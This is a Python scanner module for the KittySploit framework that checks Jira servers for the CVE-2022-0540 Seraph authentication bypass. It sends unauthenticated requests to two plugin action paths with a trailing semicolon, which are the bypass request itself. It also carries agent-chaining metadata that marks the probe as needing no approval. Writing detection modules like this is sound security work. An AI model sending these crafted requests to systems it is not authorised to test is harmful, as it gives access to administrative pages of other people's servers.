#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atlassian Jira Seraph - Authentication Bypass Detection',
        'description': 'Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted HTTP request. This affects Atlassian Jira Server and Data Center versions before 8.13.18, versions 8.14.0 and later before 8.20.6, and versions 8.21.0 and later before 8.22.0. This also affects Atlassian Jira Service Management Server and Data Center versions before 4.13.18, versions 4.14.0 and later before 4.20.6, and versions 4.21.0 and later before 4.22.0.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'atlassian', 'jira', 'exposure', 'auth-bypass', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.viettelcybersecurity.com/cve-2022-0540-authentication-bypass-in-seraph/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0540',
            'https://confluence.atlassian.com/display/JIRA/Jira+Security+Advisory+2022-04-20',
            'https://jira.atlassian.com/browse/JRASERVER-73650',
            'https://jira.atlassian.com/browse/JSDSERVER-11224',
        ],
        'cve': 'CVE-2022-0540',
    }

    def run(self):
        for path in ('/InsightPluginShowGeneralConfiguration.jspa;', '/secure/WBSGanttManageScheduleJobAction.jspa;'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('General Insight Configuration',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='critical',
                    reason="Atlassian Jira Seraph - Authentication Bypass detected",
                    path=path,
                )
                return True
        return False

